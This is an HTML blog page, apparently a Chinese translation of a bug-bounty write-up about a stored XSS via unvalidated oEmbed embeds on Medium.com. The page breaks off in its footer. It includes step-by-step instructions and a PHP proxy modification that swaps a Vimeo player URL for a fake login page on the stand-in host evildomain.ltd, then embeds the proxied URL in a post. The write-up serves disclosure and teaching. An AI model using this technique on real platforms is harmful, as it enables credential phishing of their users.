@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="TimeS0ng" />
+
+
+
+<meta name="description" content="原文：Persistent XSS (Unvalidated oEmbed) at Medium.com漏洞：作者：Jonathan Bouman难度：高">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第二十一篇：存储型XSS（前续）">
+<meta property="og:url" content="http://TimeS0ng.github.io/2019/02/26/第二十一篇：存储型XSS（前续）/index.html">
+<meta property="og:site_name" content="TimeS0ng&#39;s blog">
+<meta property="og:description" content="原文：Persistent XSS (Unvalidated oEmbed) at Medium.com漏洞：作者：Jonathan Bouman难度：高">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/1.gif">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/2.jpeg">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/3.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/4.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/5.jpeg">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/7.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/8.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/9.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/10.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/11.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/12.jpeg">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/13.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/14.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/15.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/16.png">
+<meta property="og:updated_time" content="2019-02-26T10:19:22.344Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第二十一篇：存储型XSS（前续）">
+<meta name="twitter:description" content="原文：Persistent XSS (Unvalidated oEmbed) at Medium.com漏洞：作者：Jonathan Bouman难度：高">
+<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_21/1.gif">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="TimeS0ng&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>第二十一篇：存储型XSS（前续） | TimeS0ng&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">TimeS0ng</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://03i0.com">sn00py&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://edvison.cn">Edvison&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ph0rse.me/">ph0rse&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.likesec.com">ur10ser&#39;s blog</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注技术，乐于分享</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">TimeS0ng</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">TimeS0ng</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-第二十一篇：存储型XSS（前续）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/02/26/第二十一篇：存储型XSS（前续）/" class="article-date">
+      <time datetime="2019-02-26T08:49:32.000Z" itemprop="datePublished">2019-02-26</time>
+</a>
+
+ 
+    <a href="/2019/02/26/第二十一篇：存储型XSS（前续）/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+        
+            <span class="disqus-comment-count" data-disqus-identifier="2019/02/26/第二十一篇：存储型XSS（前续）/"></span>
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      第二十一篇：存储型XSS（前续）
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h4 id="原文：Persistent-XSS-Unvalidated-oEmbed-at-Medium-com"><a href="#原文：Persistent-XSS-Unvalidated-oEmbed-at-Medium-com" class="headerlink" title="原文：Persistent XSS (Unvalidated oEmbed) at Medium.com"></a>原文：<a href="https://medium.com/@jonathanbouman/stored-xss-unvalidated-embed-at-medium-com-528b0d6d4982" target="_blank" rel="external">Persistent XSS (Unvalidated oEmbed) at Medium.com</a></h4><h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><h4 id="作者：Jonathan-Bouman"><a href="#作者：Jonathan-Bouman" class="headerlink" title="作者：Jonathan Bouman"></a>作者：<a href="https://medium.com/@jonathanbouman" target="_blank" rel="external">Jonathan Bouman</a></h4><h4 id="难度：高"><a href="#难度：高" class="headerlink" title="难度：高"></a>难度：高</h4><a id="more"></a>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/1.gif" alt=""></p>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h4 id="emsp-emsp-在我们之前的一篇报告中，我们学会了关于反射型XSS的知识；reflect-XSS的缺点是我们需要欺骗用户访问攻击者构造好的URL。"><a href="#emsp-emsp-在我们之前的一篇报告中，我们学会了关于反射型XSS的知识；reflect-XSS的缺点是我们需要欺骗用户访问攻击者构造好的URL。" class="headerlink" title="&emsp;&emsp;在我们之前的一篇报告中，我们学会了关于反射型XSS的知识；reflect XSS的缺点是我们需要欺骗用户访问攻击者构造好的URL。"></a>&emsp;&emsp;在我们之前的一篇<a href="https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c" target="_blank" rel="external">报告</a>中，我们学会了关于反射型XSS的知识；<a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Reflected_XSS_Attacks" target="_blank" rel="external">reflect XSS</a>的缺点是我们需要欺骗用户访问攻击者构造好的URL。</h4><h4 id="emsp-emsp-但是，如果我们可以将我们的javascript代码存储在页面中呢？"><a href="#emsp-emsp-但是，如果我们可以将我们的javascript代码存储在页面中呢？" class="headerlink" title="&emsp;&emsp;但是，如果我们可以将我们的javascript代码存储在页面中呢？"></a>&emsp;&emsp;但是，如果我们可以将我们的javascript代码存储在页面中呢？</h4><h4 id="emsp-emsp-那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。"><a href="#emsp-emsp-那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。" class="headerlink" title="&emsp;&emsp;那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。"></a>&emsp;&emsp;那么影响只会更大；没有特殊构造的URL和万恶的XSS防火墙破坏我们的游戏。我们称之为存储型XSS或者持久性XSS攻击。</h4><h4 id="emsp-emsp-一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium-com怎么样？他们的奖金超级丰厚"><a href="#emsp-emsp-一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium-com怎么样？他们的奖金超级丰厚" class="headerlink" title="&emsp;&emsp;一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium.com怎么样？他们的奖金超级丰厚"></a>&emsp;&emsp;一如既往，我们正在寻找鼓励我们挖掘BUG的目标。那么Medium.com怎么样？他们的奖金超级丰厚</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/2.jpeg" alt=""></p>
+<h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><h4 id="emsp-emsp-存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。"><a href="#emsp-emsp-存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。" class="headerlink" title="&emsp;&emsp;存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。"></a>&emsp;&emsp;存储信息并于他人分享信息是Medium的主要业务。我们只需找到一种将我们的恶意代码放入信息并执行它的方法，那么让我们来看看他们的编辑器吧。</h4><h4 id="emsp-emsp-编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）"><a href="#emsp-emsp-编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）" class="headerlink" title="&emsp;&emsp;编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）"></a>&emsp;&emsp;编辑器支持不同类型的内容（纯文本，图像和媒体嵌入）</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/3.png" alt=""></p>
+<h4 id="emsp-emsp-通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的-按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed"><a href="#emsp-emsp-通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的-按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed" class="headerlink" title="&emsp;&emsp;通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的(+)按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed"></a>&emsp;&emsp;通过媒体嵌入，您可以丰富文章内容。例如：加载外部视频，显示您的twitter个人信息来丰富推文内容等等。要做到这些您只需要按下编辑器的(+)按钮，然后粘贴网址，最后按下回车就可以了，这种有趣的技术名为：oEmbed</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/4.png" alt=""></p>
+<p>[*]真正的oEmbed技术是将内容嵌入而不是图片，译者的博客没有集成类似的技术就只能图片代替</p>
+<h4 id="emsp-emsp-如果你拥有一个像Medium-com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。"><a href="#emsp-emsp-如果你拥有一个像Medium-com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。" class="headerlink" title="&emsp;&emsp;如果你拥有一个像Medium.com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。"></a>&emsp;&emsp;如果你拥有一个像Medium.com这样的平台，你想让自己的网站支持各种类型的嵌入。这意味着您应该要维护一个安全的白名单，不能让所有域名的代码都能嵌入到您的网页中去，这样才能保证安全。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/5.jpeg" alt=""></p>
+<p>[*]Embed.ly是Medium.com拥有的子公司</p>
+<h4 id="emsp-emsp-为了验证我们的概念，我们做一个fake-login"><a href="#emsp-emsp-为了验证我们的概念，我们做一个fake-login" class="headerlink" title="&emsp;&emsp;为了验证我们的概念，我们做一个fake login"></a>&emsp;&emsp;为了验证我们的概念，我们做一个fake login</h4><h4 id="寻找漏洞，Embed-ly如何运作的？"><a href="#寻找漏洞，Embed-ly如何运作的？" class="headerlink" title="寻找漏洞，Embed.ly如何运作的？"></a>寻找漏洞，Embed.ly如何运作的？</h4><h4 id="emsp-emsp-首先，他们声明他们支持oEmbed规范；"><a href="#emsp-emsp-首先，他们声明他们支持oEmbed规范；" class="headerlink" title="&emsp;&emsp;首先，他们声明他们支持oEmbed规范；"></a>&emsp;&emsp;首先，他们声明他们支持oEmbed规范；</h4><h4 id="emsp-emsp-那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake-login页面。"><a href="#emsp-emsp-那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake-login页面。" class="headerlink" title="&emsp;&emsp;那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake login页面。"></a>&emsp;&emsp;那么这是否意味着如果我们的恶意外部url包含正确的oEmbed标记我们就成功了？想象一个包含oEmbed标签的html页面，声明它自己是一个视频播放器，但是它的真实内容是加载一个fake login页面。</h4><h4 id="emsp-emsp-很遗憾，只有经过批准的提供者才能嵌入他们的代码。"><a href="#emsp-emsp-很遗憾，只有经过批准的提供者才能嵌入他们的代码。" class="headerlink" title="&emsp;&emsp;很遗憾，只有经过批准的提供者才能嵌入他们的代码。"></a>&emsp;&emsp;很遗憾，只有经过批准的提供者才能嵌入他们的代码。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/7.png" alt=""></p>
+<h4 id="emsp-emsp-让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed-ly的内部工作原理。"><a href="#emsp-emsp-让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed-ly的内部工作原理。" class="headerlink" title="&emsp;&emsp;让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed.ly的内部工作原理。"></a>&emsp;&emsp;让我们打开Medium编辑器，看看如果我们尝试嵌入Vimeo视频，浏览器会做什么。由于Vimeo在白名单上，它应该可以工作，我们可以更多地了解Embed.ly的内部工作原理。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/8.png" alt=""></p>
+<p>[*]1. 请求我们的Vimeo视频的request信息</p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/9.png" alt=""></p>
+<p>[*]2. oEmbed的响应信息，mediaResourceId是内部唯一标志符</p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/10.png" alt=""></p>
+<p>[*]3. POST请求，告诉Medium.com使用mediaResourceId包含我们的视频</p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/11.png" alt=""></p>
+<p>[*]4. 请求oEmbed HTML，用来显示oEmbed</p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/12.jpeg" alt=""></p>
+<p>[*]5. 响应oEmbed HTML，包含由Embed.ly托管的Vimeo播放器</p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/13.png" alt=""></p>
+<p>[*]6. 请求来自oEmbed HTML中iframe标签的内容</p>
+<h4 id="emsp-emsp-值得注意的是，Embed-ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed-ly立即就能从缓存中提取，不必再去请求一遍。"><a href="#emsp-emsp-值得注意的是，Embed-ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed-ly立即就能从缓存中提取，不必再去请求一遍。" class="headerlink" title="&emsp;&emsp;值得注意的是，Embed.ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed.ly立即就能从缓存中提取，不必再去请求一遍。"></a>&emsp;&emsp;值得注意的是，Embed.ly为每个嵌入的内容创建了一个mediaResourceId。这个mediaResourceId是URL的MD5哈希值。这是一个聪明的举动，允许他们缓存结果。是否有人嵌入已经处理过的网址？Embed.ly立即就能从缓存中提取，不必再去请求一遍。</h4><h4 id="emsp-emsp-因此我们需要欺骗Embed-ly为我们的fake-login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake-login，这样当Medium请求mediaResourceId的时候就会加载我们的fake-login"><a href="#emsp-emsp-因此我们需要欺骗Embed-ly为我们的fake-login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake-login，这样当Medium请求mediaResourceId的时候就会加载我们的fake-login" class="headerlink" title="&emsp;&emsp;因此我们需要欺骗Embed.ly为我们的fake login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake login，这样当Medium请求mediaResourceId的时候就会加载我们的fake login"></a>&emsp;&emsp;因此我们需要欺骗Embed.ly为我们的fake login页面创建mediaResourceId。此外，这个mediaResourceId应该提供一个响应，通过iframe加载我们的fake login，这样当Medium请求mediaResourceId的时候就会加载我们的fake login</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/14.png" alt=""></p>
+<p>[*]7. 没有成功</p>
+<h4 id="emsp-emsp-没有公共，我尝试了多种办法均没有达到效果！"><a href="#emsp-emsp-没有公共，我尝试了多种办法均没有达到效果！" class="headerlink" title="&emsp;&emsp;没有公共，我尝试了多种办法均没有达到效果！"></a>&emsp;&emsp;没有公共，我尝试了多种办法均没有达到效果！</h4><h4 id="emsp-emsp-所以我们必须考虑其它办法了。"><a href="#emsp-emsp-所以我们必须考虑其它办法了。" class="headerlink" title="&emsp;&emsp;所以我们必须考虑其它办法了。"></a>&emsp;&emsp;所以我们必须考虑其它办法了。</h4><h4 id="emsp-emsp-下面的代码是-截图6-的请求内容"><a href="#emsp-emsp-下面的代码是-截图6-的请求内容" class="headerlink" title="&emsp;&emsp;下面的代码是[截图6]的请求内容"></a>&emsp;&emsp;下面的代码是[截图6]的请求内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /widgets/media.html?src=https%3A%2F%2Fplayer.vimeo.com%2Fvideo%2F142424242%3Fapp_id%3D122963&amp;dntp=1&amp;url=https%3A%2F%2Fvimeo.com%2F142424242&amp;image=https%3A%2F%2Fi.vimeocdn.com%2Fvideo%2F540139087_1280.jpg&amp;key=b19fcc184b9711e1b4764040d3dc5c07&amp;type=text%2Fhtml&amp;schema=vimeo</div></pre></td></tr></table></figure>
+<h4 id="Decoded"><a href="#Decoded" class="headerlink" title="Decoded:"></a>Decoded:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /widgets/media.html?src=https://player.vimeo.com/video/142424242?app_id=122963&amp;dntp=1&amp;url=https://vimeo.com/142424242&amp;image=https://i.vimeocdn.com/video/540139087_1280.jpg&amp;key=b19fcc184b9711e1b4764040d3dc5c07&amp;type=text/html&amp;schema=vimeo</div></pre></td></tr></table></figure>
+<h4 id="emsp-emsp-如果我们可以做某种中间人攻击-MITM-并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake-login页面。搜索指向Vimeo播放器的字符串https-player-vimeo-com-video-142424242-并将其更改为https-evildomain-ltd-fakelogin"><a href="#emsp-emsp-如果我们可以做某种中间人攻击-MITM-并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake-login页面。搜索指向Vimeo播放器的字符串https-player-vimeo-com-video-142424242-并将其更改为https-evildomain-ltd-fakelogin" class="headerlink" title="&emsp;&emsp;如果我们可以做某种中间人攻击[MITM]并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake login页面。搜索指向Vimeo播放器的字符串https://player.vimeo.com/video/142424242 并将其更改为https://evildomain.ltd/fakelogin"></a>&emsp;&emsp;如果我们可以做某种中间人攻击[MITM]并假装我们是Vimeo呢？我们将更改Vimeo响应，以便加载我们的fake login页面。搜索指向Vimeo播放器的字符串<a href="https://player.vimeo.com/video/142424242" target="_blank" rel="external">https://player.vimeo.com/video/142424242</a> 并将其更改为<a href="https://evildomain.ltd/fakelogin" target="_blank" rel="external">https://evildomain.ltd/fakelogin</a></h4><h2 id="MITM-Attack"><a href="#MITM-Attack" class="headerlink" title="MITM Attack"></a><strong>MITM Attack</strong></h2><h4 id="1-快速设置：打开你的PHP服务器，上传fakelogin-html（包含正确设计的fake-login），上传proxy-php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）"><a href="#1-快速设置：打开你的PHP服务器，上传fakelogin-html（包含正确设计的fake-login），上传proxy-php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）" class="headerlink" title="1. 快速设置：打开你的PHP服务器，上传fakelogin.html（包含正确设计的fake login），上传proxy.php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）"></a>1. 快速设置：打开你的PHP服务器，上传fakelogin.html（包含正确设计的fake login），上传proxy.php（miniProxy，允许我们加载外部URL，更改响应，提供更改后的响应）</h4><h4 id="2-在proxy-php-第381行上面添加一行"><a href="#2-在proxy-php-第381行上面添加一行" class="headerlink" title="2. 在proxy.php 第381行上面添加一行"></a>2. 在proxy.php 第381行上面添加一行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//Parse the DOM:</div><div class="line">$responseBody = str_replace(&quot;https://player.vimeo.com/video/142424242&quot;, &quot;https://evildomain.ltd/embedly/fakelogin.html&quot;, $responseBody);</div></pre></td></tr></table></figure>
+<h4 id="3-创建一个新的Medium文章"><a href="#3-创建一个新的Medium文章" class="headerlink" title="3. 创建一个新的Medium文章"></a>3. 创建一个新的Medium文章</h4><h4 id="4-嵌入网址https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242"><a href="#4-嵌入网址https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242" class="headerlink" title="4. 嵌入网址https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242"></a>4. 嵌入网址<a href="https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242" target="_blank" rel="external">https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242</a></h4><h4 id="5-Medium-com他们的服务器将从https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake-login页面而不是视频播放器"><a href="#5-Medium-com他们的服务器将从https-evildomain-ltd-embedly-proxy-php-https-vimeo-com-142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake-login页面而不是视频播放器" class="headerlink" title="5. Medium.com他们的服务器将从https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake login页面而不是视频播放器"></a>5. Medium.com他们的服务器将从<a href="https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake" target="_blank" rel="external">https://evildomain.ltd/embedly/proxy.php?https://vimeo.com/142424242请求oEmbed信息，我们向他们发送一个与Vimeo相同的响应，仅在此时包含我们的fake</a> login页面而不是视频播放器</h4><h4 id="6-等待"><a href="#6-等待" class="headerlink" title="6. 等待"></a>6. 等待</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/15.png" alt=""></p>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_21/16.png" alt=""></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/02/26/第二十一篇：存储型XSS（前续）/">第二十一篇：存储型XSS（前续）</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
+        <p><span>发布时间:</span>2019-02-26, 16:49:32</p>
+        <p><span>最后更新:</span>2019-02-26, 18:19:22</p>
+        <p>
